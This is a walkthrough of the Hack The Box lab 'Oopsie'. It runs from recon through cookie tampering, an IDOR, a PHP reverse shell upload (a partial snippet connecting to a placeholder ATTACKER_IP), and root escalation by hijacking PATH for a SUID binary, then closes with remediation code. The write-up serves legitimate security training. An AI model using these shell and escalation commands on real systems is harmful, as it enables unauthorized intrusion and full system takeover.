# Oopsie Write-up - Hack The Box Starting Point

## Executive Summary

**Lab Overview:** Oopsie is a beginner-friendly web application security lab from Hack The Box's Starting Point series that demonstrates the critical importance of proper access control mechanisms and secure file upload implementations.

**Primary Vulnerabilities:**
- Information Disclosure via URL parameter manipulation
- Broken Access Control (OWASP Top 10 #A01:2021)
- Insecure File Upload leading to Remote Code Execution
- SUID Binary exploitation with PATH manipulation
- Credential reuse across services

**Tools and Techniques Used:**
- Network reconnaissance (Nmap)
- Web application testing (Burp Suite, Browser Developer Tools)
- Directory enumeration (Gobuster)
- Reverse shell payloads (PHP)
- Privilege escalation via SUID binaries

**Skill Level:** Beginner  
**Estimated Completion Time:** 2-3 hours  
**Learning Objectives:** Understanding web authentication flaws, file upload vulnerabilities, and basic Linux privilege escalation

---

## Reconnaissance

### Network Scanning

Initial reconnaissance begins with port discovery using Nmap to identify available services on the target system.

```bash
nmap -sC -sV {TARGET_IP}
```

**Scan Results:**
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 12:35 EDT
Nmap scan report for {TARGET_IP}
Host is up (0.091s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**
- **Port 22 (SSH):** OpenSSH 7.6p1 - Standard SSH service
- **Port 80 (HTTP):** Apache httpd 2.4.29 - Web server hosting the target application

### Web Application Discovery

Accessing the web application at `http://{TARGET_IP}` reveals the **MegaCorp Automotive** website, which appears to be a corporate site for an automotive company promoting electric vehicle ecosystems.

**Initial Observations:**
- Professional corporate website design
- Navigation includes: Services, About, Contact
- Services page mentions login requirement: "Please login to get access to the service"
- No obvious login form on the main pages

---

## Guided Questions

### Task 1: Web Traffic Interception Tool

**Question:** With what kind of tool can intercept web traffic?

**Importance:**
- **Learning Objective:** Understanding web proxies and their role in security testing
- **CTF Progression:** Essential for discovering hidden endpoints and analyzing application behavior
- **Real-world Relevance:** Web proxies are fundamental tools in penetration testing for request/response analysis

**Methodology:**
The question asks about tools capable of intercepting web traffic. In cybersecurity testing, web proxies are the primary tools used for this purpose.

**Tools Used:**
- Burp Suite (industry standard web application security testing platform)
- Browser configuration for proxy routing (Chromium/Chrome or Firefox)

**Step-by-Step:**
1. **Burp Suite Setup:** Launch Burp Suite and configure proxy listener on 127.0.0.1:8080 (or 8081 if port conflicts occur)

2. **Browser Configuration (Chromium/Chrome - Burp's Current Default):**
   - Install browser proxy extension like "Proxy SwitchyOmega" or use system settings
   - Configure HTTP proxy: 127.0.0.1, Port 8080
   - Alternative: Launch Chrome with proxy flags:
     ```bash
     google-chrome --proxy-server=127.0.0.1:8080 --disable-web-security
     ```

3. **Browser Configuration (Firefox - Traditional Method):**
   - Access Firefox preferences (hamburger menu > Preferences)
   - Search for "proxy" and click Settings
   - Select "Manual proxy configuration"
   - Configure HTTP Proxy: 127.0.0.1, Port 8080
   - Enable "Also use this proxy for FTP and HTTPS"

4. **Disable Interception:** Turn off "Intercept is on" to enable passive spidering
5. **Browse Application:** Navigate through the website to populate Burp's sitemap

**Note:** Burp Suite has shifted their default browser recommendation from Firefox to Chromium-based browsers. Both methods work effectively for web application testing.

**Answer:** **proxy**

---

### Task 2: Login Page Directory Path

**Question:** What is the path to the directory on the webserver that returns a login page?

**Importance:**
- **Learning Objective:** Demonstrates the value of passive reconnaissance and site mapping
- **CTF Progression:** Hidden directories often contain administrative interfaces
- **Real-world Relevance:** Discovering admin panels and login interfaces is crucial in web app testing

**Methodology:**
Using Burp Suite's passive spidering capability to discover hidden directories and endpoints not linked from the main navigation.

**Tools Used:**
- Burp Suite Target > Sitemap feature
- Passive web crawling

**Step-by-Step:**
1. **Configure Burp Proxy:** Ensure browser traffic routes through Burp Suite
2. **Browse Application:** Visit main pages to trigger passive discovery
3. **Analyze Sitemap:** Navigate to Target > Sitemap in Burp Suite
4. **Identify Hidden Paths:** Examine discovered directories and files
5. **Locate Login Interface:** Find directories containing authentication mechanisms

**Flag Location:** Discovered through Burp Suite's passive enumeration  
**Flag Format:** `/path/to/login/directory`

**Answer:** `/cdn-cgi/login`

---

### Task 3: Firefox Modification for Upload Access

**Question:** What can be modified in Firefox to get access to the upload page?

**Importance:**
- **Learning Objective:** Understanding client-side security controls and their limitations
- **CTF Progression:** Demonstrates how access controls can be bypassed through session manipulation
- **Real-world Relevance:** Shows why server-side validation is essential for security

**Methodology:**
After discovering the login page and attempting guest login, the upload functionality requires "super admin" privileges. This suggests client-side access control through session management.

**Tools Used:**
- Browser Developer Tools (Chrome DevTools or Firefox Developer Tools)
- Browser Storage inspection (works in both Chrome and Firefox)

1. **Access Login Page:** Navigate to `/cdn-cgi/login`
2. **Guest Login:** Use "Login as Guest" option
3. **Attempt Upload Access:** Try accessing the Uploads section (blocked)
4. **Inspect Storage:**
   - Right-click > Inspect Element > Application tab > Cookies (Chromium)
   - Alternatively, use Application tab > Cookies (Chrome)
5. **Examine Cookies:** Review session cookies and their values
6. **Identify Access Control:** Note `role=guest` and `user=2233` parameters
7. **Enumerate Users:** Modify URL parameter `id=1` to discover admin user (ID: 34322)
8. **Modify Session:** Change cookie values to `role=admin` and `user=34322`

**Answer:** **cookie**

---

### Task 4: Admin User Access ID

**Question:** What is the access ID of the admin user?

**Importance:**
- **Learning Objective:** Information disclosure through URL parameter manipulation
- **CTF Progression:** Obtaining admin credentials for privilege escalation
- **Real-world Relevance:** IDOR (Insecure Direct Object Reference) vulnerabilities are common in web apps

**Methodology:**
Leveraging the information disclosure vulnerability in the accounts page to enumerate user accounts.

**Step-by-Step:**
1. **Identify Enumeration Point:** URL pattern `/admin.php?content=accounts&id=2`
2. **Parameter Manipulation:** Change `id=2` to `id=1`
3. **Information Disclosure:** Observe admin user details in response
4. **Extract Access ID:** Note the admin user's access ID from the displayed information

**Flag Capture:**
- **Flag Location:** URL parameter enumeration reveals admin account details
- **Verification:** Admin access ID is displayed in the accounts listing

**Answer:** **34322**

---

### Task 5: File Upload Directory

**Question:** On uploading a file, what directory does that file appear in on the server?

**Importance:**
- **Learning Objective:** Understanding file upload mechanisms and server-side storage
- **CTF Progression:** Required for accessing uploaded reverse shell
- **Real-world Relevance:** File upload directories are common attack vectors if misconfigured

**Methodology:**
After gaining admin access and uploading a PHP reverse shell, determine where uploaded files are stored on the server.

**Tools Used:**
- Gobuster for directory enumeration
- Logical deduction based on common web server configurations

**Step-by-Step:**
1. **Gain Admin Access:** Use modified cookies to access upload functionality
2. **Upload Test File:** Upload a PHP reverse shell file
    - Get reverse shell from `https://github.com/BlackArch/webshells` if they are not already available.
    - Upload example: `php-reverse-shell.php`
    -
3. **Directory Enumeration:** Use Gobuster to discover common directories
   ```bash
   gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
   ```
   - If the wordlist is nota available on you macine you can create a simple one with the following command:
   ```bash
   cat > small_wordlist.txt << EOF
   admin
   uploads
   login
   config
   backup
   test
   images
   css
   js
   api
   files
   includes
   database
   phpmyadmin
   EOF
   ```

4. **Identify Upload Directory:** Locate the directory containing uploaded files
5. **Verify Access:** Confirm uploaded file is accessible in discovered directory

**Answer:** **/uploads**

---

### Task 6: Password File Location

**Question:** What is the file that contains the password that is shared with the robert user?

**Importance:**
- **Learning Objective:** Source code review and credential discovery
- **CTF Progression:** Lateral movement from web shell to user account
- **Real-world Relevance:** Hardcoded credentials in source code are a critical vulnerability

**Methodology:**
After obtaining a reverse shell, enumerate the web application files to locate database configuration and credential files.

**Tools Used:**
- Reverse shell access
- File system enumeration
- Grep for password patterns

**Step-by-Step:**
1. **Establish Reverse Shell:** Access uploaded PHP reverse shell
2. **Navigate to Web Directory:** Change to `/var/www/html/cdn-cgi/login/`
3. **Search for Credentials:** Use grep to find password-related strings
   ```bash
   cat * | grep -i passw*
   ```
4. **Examine PHP Files:** Review database configuration files
5. **Identify Credential File:** Locate file containing the shared password

**Answer:** **db.php**

---

### Task 7: Bugtracker Group File Discovery

**Question:** What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?

**Importance:**
- **Learning Objective:** Linux file system enumeration and group-based permissions
- **CTF Progression:** Discovering privilege escalation vectors through group membership
- **Real-world Relevance:** Group-based file permissions are common in enterprise environments

**Methodology:**
After gaining access as user 'robert', enumerate files and executables associated with the bugtracker group for potential privilege escalation paths.

**Tools Used:**
- Find command with group filtering
- Linux permission analysis

**Step-by-Step:**
1. **Check User Groups:** Verify robert's group membership with `id`
2. **Group-based File Search:** Use find command to locate group-owned files
   ```bash
   find / -group bugtracker 2>/dev/null
   ```
3. **Identify Executable:** Locate executable files with special permissions
4. **Analyze Permissions:** Check for SUID bits and other special permissions

**Answer:** **find**

---

### Task 8: SUID Binary Execution Context

**Question:** Regardless of which user starts running the bugtracker executable, what user's privileges will be used to run?

**Importance:**
- **Learning Objective:** Understanding SUID (Set User ID) permissions in Linux
- **CTF Progression:** Key concept for privilege escalation exploitation
- **Real-world Relevance:** SUID binaries are common privilege escalation vectors

**Methodology:**
Analyze the bugtracker binary's permissions to understand its execution context and privilege implications.

**Step-by-Step:**
1. **Locate Binary:** Find the bugtracker executable in `/usr/bin/bugtracker`
2. **Check Permissions:** Examine file permissions with `ls -la`
3. **Identify SUID Bit:** Look for 's' in the owner execute position
4. **Determine Owner:** Check which user owns the SUID binary

**Permission Analysis:**
```bash
ls -la /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker
```

The 's' in the owner execute position indicates SUID is set, and the file is owned by root.

**Answer:** **root**

---

### Task 9: SUID Definition

**Question:** What does SUID stand for?

**Importance:**
- **Learning Objective:** Fundamental Linux security concept
- **CTF Progression:** Essential knowledge for privilege escalation
- **Real-world Relevance:** SUID is a critical security mechanism in Unix-like systems

**Methodology:**
Understanding the SUID (Set User ID) permission mechanism and its security implications.

**Concept Explanation:**
SUID is a special permission in Unix-like operating systems that allows a program to run with the privileges of the file owner rather than the user executing it.

**Answer:** **Set owner User ID**

---

### Task 10: Insecurely Called Executable

**Question:** What is the name of the executable being called in an insecure manner?

**Importance:**
- **Learning Objective:** PATH manipulation vulnerabilities in SUID binaries
- **CTF Progression:** Final step in privilege escalation chain
- **Real-world Relevance:** Insecure command execution is a common vulnerability in custom applications

**Methodology:**
Analyze the bugtracker binary's behavior to identify how it executes external commands and potential exploitation vectors.

**Step-by-Step:**
1. **Execute Binary:** Run `/usr/bin/bugtracker` to observe behavior
2. **Analyze Output:** Note that it uses `cat` command to read files
3. **Identify Vulnerability:** Binary calls `cat` without absolute path
4. **PATH Exploitation:** Create malicious `cat` in `/tmp` and modify PATH

**Exploitation Process:**
```bash
# Create malicious cat
echo "/bin/sh" > /tmp/cat
chmod +x /tmp/cat

# Modify PATH to prioritize /tmp
export PATH=/tmp:$PATH

# Execute bugtracker to trigger privilege escalation
/usr/bin/bugtracker
```

**Answer:** **cat**

---

## Exploitation Details

### Vulnerability Analysis

**1. Information Disclosure (CWE-200)**
- **Root Cause:** URL parameter `id` allows enumeration of user accounts without authorization
- **Risk Level:** Medium - Leads to credential discovery and privilege escalation
- **OWASP Classification:** A01:2021 – Broken Access Control

**2. Broken Access Control (CWE-285)**
- **Root Cause:** Client-side session management allows privilege escalation through cookie manipulation
- **Risk Level:** High - Direct admin access bypass
- **OWASP Classification:** A01:2021 – Broken Access Control

**3. Unrestricted File Upload (CWE-434)**
- **Root Cause:** No file type validation or content filtering on upload functionality
- **Risk Level:** Critical - Leads to Remote Code Execution
- **OWASP Classification:** A03:2021 – Injection

**4. SUID Binary PATH Manipulation (CWE-426)**
- **Root Cause:** Custom binary executes system commands without absolute paths
- **Risk Level:** High - Local privilege escalation to root
- **Impact:** Complete system compromise

### Exploit Development

**PHP Reverse Shell Payload:**
```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'ATTACKER_IP';  // Change to your IP
$port = 1234;         // Change to your listening port
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
// ... [shell code continues]
?>
```

**SUID Exploitation Script:**
```bash
#!/bin/bash
# Create malicious cat binary
echo "#!/bin/bash" > /tmp/cat
echo "/bin/sh" >> /tmp/cat
chmod +x /tmp/cat

# Modify PATH environment
export PATH=/tmp:$PATH

# Trigger privilege escalation
/usr/bin/bugtracker
```

### Proof of Concept

**1. Web Application Compromise:**
- Successfully bypassed authentication through cookie manipulation
- Gained admin access to upload functionality
- Uploaded and executed PHP reverse shell
- Obtained `www-data` shell on target system

**2. Lateral Movement:**
- Discovered hardcoded credentials in `db.php`
- Successfully authenticated as user 'robert'
- Accessed user flag: `HTB{user_flag_here}`

**3. Privilege Escalation:**
- Identified SUID binary owned by root
- Exploited PATH manipulation vulnerability
- Achieved root access and obtained root flag: `HTB{root_flag_here}`

---

## Privilege Escalation

### Initial Foothold Establishment

After uploading the PHP reverse shell and gaining access as `www-data`, the first step involves establishing a stable shell and beginning local enumeration.

```bash
# Establish netcat listener
nc -lvnp 1234

# Access reverse shell
http://{TARGET_IP}/uploads/php-reverse-shell.php

# Upgrade to interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Local Enumeration Methods

**Credential Discovery:**
```bash
# Navigate to web application directory
cd /var/www/html/cdn-cgi/login

# Search for password-related strings
cat * | grep -i passw*

# Found in db.php:
# $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

**User Enumeration:**
```bash
# Check available users
cat /etc/passwd | grep -E "(bash|sh)$"

# Identify target user: robert
```

### Escalation Vector Identification

**Group Membership Analysis:**
```bash
# Check robert's group membership
id
# uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)

# Find files owned by bugtracker group
find / -group bugtracker 2>/dev/null
# /usr/bin/bugtracker
```

**SUID Binary Analysis:**
```bash
# Check permissions and file type
ls -la /usr/bin/bugtracker
file /usr/bin/bugtracker

# Results show:
# -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker
# SUID bit set, owned by root
```

### Privilege Escalation Execution

**PATH Manipulation Exploit:**
```bash
# Create malicious cat binary in /tmp
cd /tmp
echo "/bin/sh" > cat
chmod +x cat

# Modify PATH to prioritize /tmp directory
export PATH=/tmp:$PATH

# Verify PATH modification
echo $PATH
# /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Execute bugtracker to trigger privilege escalation
/usr/bin/bugtracker

# Provide any input when prompted
# Result: Root shell obtained
```

---

## Flag Summary

| Flag ID | Associated Task | Capture Method | Difficulty |
|---------|----------------|----------------|------------|
| User Flag | Lateral Movement | Database credential reuse | 2/5 |
| Root Flag | Privilege Escalation | SUID PATH manipulation | 3/5 |

**User Flag Location:** `/home/robert/user.txt`  
**Root Flag Location:** `/root/root.txt`

---

## Lessons Learned

### Key Cybersecurity Concepts Reinforced

**1. Defense in Depth:**
- Client-side controls are insufficient for security
- Multiple layers of validation required
- Server-side enforcement is essential

**2. Access Control Principles:**
- Proper authorization checks must be implemented
- Session management requires secure design
- Information disclosure can lead to privilege escalation

**3. Secure Development Practices:**
- Input validation on all user-controlled data
- File upload restrictions and content filtering
- Absolute paths in system command execution

### Common Pitfalls and Avoidance Strategies

**1. Cookie Manipulation:**
- **Pitfall:** Trusting client-side session data
- **Solution:** Server-side session validation and authorization checks

**2. Information Disclosure:**
- **Pitfall:** Exposing sensitive data through URL parameters
- **Solution:** Proper access controls and data sanitization

**3. File Upload Vulnerabilities:**
- **Pitfall:** Insufficient file type and content validation
- **Solution:** Whitelist approach, content scanning, and sandboxing

### Alternative Approaches

**Web Application Testing:**
- Directory enumeration with different wordlists
- Automated vulnerability scanning with tools like Nikto
- Manual source code review for additional vulnerabilities

**Privilege Escalation:**
- Linux privilege escalation scripts (LinPEAS, LinEnum)
- Kernel exploit identification and testing
- Misconfigured service exploitation

---

## Remediation

### Specific Remediation Steps

**1. Information Disclosure Vulnerability:**
```php
// Before (Vulnerable)
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $user_id";

// After (Secure)
if (!isset($_SESSION['user_id']) || !isAuthorized($_SESSION['user_id'], 'view_users')) {
    die('Unauthorized access');
}
$user_id = intval($_GET['id']);
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ? AND accessible_by = ?");
$stmt->execute([$user_id, $_SESSION['user_id']]);
```

**2. Access Control Implementation:**
```php
// Implement server-side role checking
function checkAdminAccess() {
    if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
        header('Location: unauthorized.php');
        exit();
    }
    
    // Verify role in database
    $stmt = $pdo->prepare("SELECT role FROM users WHERE id = ?");
    $stmt->execute([$_SESSION['user_id']]);
    $dbRole = $stmt->fetchColumn();
    
    if ($dbRole !== 'admin') {
        session_destroy();
        header('Location: login.php');
        exit();
    }
}
```

**3. Secure File Upload:**
```php
function secureFileUpload($file) {
    // Whitelist allowed extensions
    $allowedTypes = ['jpg', 'jpeg', 'png', 'gif'];
    $fileExt = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    if (!in_array($fileExt, $allowedTypes)) {
        throw new Exception('Invalid file type');
    }
    
    // Check MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file['tmp_name']);
    $allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
    
    if (!in_array($mimeType, $allowedMimes)) {
        throw new Exception('Invalid MIME type');
    }
    
    // Rename file and store outside web root
    $newName = uniqid() . '.' . $fileExt;
    $uploadPath = '/var/uploads/' . $newName;
    
    if (!move_uploaded_file($file['tmp_name'], $uploadPath)) {
        throw new Exception('Upload failed');
    }
    
    return $newName;
}
```

### Configuration Hardening Recommendations

**Web Server Configuration:**
```apache
# Disable directory browsing
Options -Indexes

# Prevent execution of uploaded files
<Directory "/var/www/html/uploads">
    php_flag engine off
    AddType text/plain .php .php3 .phtml .pht
</Directory>

# Security headers
Header always set X-Content-Type-Options nosniff
Header always set X-Frame-Options DENY
Header always set X-XSS-Protection "1; mode=block"
```

**System Hardening:**
```bash
# Remove unnecessary SUID binaries
find / -perm -4000 -type f 2>/dev/null | xargs ls -la

# Implement proper PATH in custom applications
#!/bin/bash
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
/bin/cat "$1"  # Use absolute path
```

### Monitoring and Detection Strategies

**Web Application Monitoring:**
- Implement logging for all authentication attempts
- Monitor for unusual parameter manipulation
- Alert on multiple failed login attempts
- Log all file upload activities

**System Monitoring:**
- Monitor SUID binary execution
- Alert on PATH environment variable modifications
- Track privilege escalation attempts
- Implement file integrity monitoring

---

## Tools and References

### Complete Toolkit

**Reconnaissance Tools:**
- **Nmap 7.91:** Network discovery and port scanning
- **Gobuster:** Directory and file enumeration
- **Burp Suite Community:** Web application security testing
- **Modern Browser:** Chrome/Chromium (current Burp recommendation) or Firefox for proxy configuration

**Exploitation Tools:**
- **PHP Reverse Shell:** `/usr/share/webshells/php/php-reverse-shell.php`
- **Netcat:** Reverse shell listener and network utilities
- **Browser Developer Tools:** Cookie manipulation and storage inspection (Chrome DevTools or Firefox Developer Tools)
- **Modern Browser:** For proxy configuration and web application interaction

**Post-Exploitation Tools:**
- **Find command:** Group-based file enumeration
- **Grep:** Pattern searching in files
- **Custom bash scripts:** PATH manipulation exploitation

### Useful Commands and Syntax References

**Network Scanning:**
```bash
# TCP SYN scan with default scripts and version detection
nmap -sC -sV <target_ip>

# Full port scan
nmap -p- <target_ip>

# UDP scan for top ports
nmap -sU --top-ports 1000 <target_ip>
```

**Web Enumeration:**
```bash
# Directory enumeration with extensions
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# Subdomain enumeration
gobuster dns -d <domain> -w /usr/share/wordlists/subdomains-top1million-20000.txt
```

**Browser and Proxy Configuration:**
```bash
# Launch Chrome with proxy (alternative to extensions)
google-chrome --proxy-server=127.0.0.1:8080 --disable-web-security --user-data-dir=/tmp/chrome-proxy

# Launch Chromium with proxy
chromium-browser --proxy-server=127.0.0.1:8080 --disable-web-security --user-data-dir=/tmp/chromium-proxy

# For Firefox users (manual proxy configuration in preferences)
# Network Settings > Manual proxy configuration > HTTP Proxy: 127.0.0.1:8080
```

**File System Enumeration:**
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find files by group
find / -group <groupname> 2>/dev/null

# Search for writable directories
find / -writable -type d 2>/dev/null | grep -v proc
```

### External Resources and Documentation

**Web Application Security:**
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

**Linux Privilege Escalation:**
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries exploitation
- [PEAS Suite](https://github.com/carlospolop/PEASS-ng) - Privilege escalation scripts
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Security payloads

**Burp Suite Resources:**
- [Official Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Using Web Proxies HTB Academy Module](https://academy.hackthebox.com/course/preview/using-web-proxies)

### Additional Reading Materials

**Books:**
- "The Web Application Hacker's Handbook" by Dafydd Stuttard and Marcus Pinto
- "Linux Privilege Escalation for Beginners" by various security researchers
- "Real-World Bug Hunting" by Peter Yaworski

**Practice Platforms:**
- [Hack The Box Academy](https://academy.hackthebox.com/) - Structured learning paths
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs) - Hands-on web security labs
- [VulnHub](https://www.vulnhub.com/) - Vulnerable virtual machines

---

## Ethical Guidelines and Disclaimer

**⚠️ IMPORTANT LEGAL NOTICE**

This writeup is intended solely for educational purposes and authorized security testing. The techniques demonstrated should only be used in the following contexts:

- **Authorized Penetration Testing:** With explicit written permission
- **Personal Learning Environments:** On systems you own or have explicit permission to test
- **Capture The Flag Competitions:** In designated CTF environments
- **Educational Labs:** Such as Hack The Box, TryHackMe, or similar platforms

**Prohibited Uses:**
- Testing systems without explicit authorization
- Accessing systems or data without permission
- Using these techniques for malicious purposes
- Violating computer fraud and abuse laws

**Legal Responsibility:**
Users of this information are solely responsible for ensuring their activities comply with applicable laws and regulations. Always obtain proper authorization before conducting security assessments.

**Flag Handling Policy:**
Actual flag values have been redacted from this writeup. When sharing solutions:
- Use placeholder formats like `HTB{example_flag_format}`
- Never share actual flag values publicly
- Respect the educational nature of CTF platforms

**Academic Integrity:**
While this writeup provides detailed solutions, learners are encouraged to:
- Attempt challenges independently first
- Use writeups as learning aids, not shortcuts
- Understand the underlying concepts, not just the commands
- Practice responsible disclosure in real-world scenarios

---

*This writeup was created for educational purposes as part of the Hack The Box Starting Point series. All techniques demonstrated are well-known security testing methods used by professionals in authorized security assessments.*
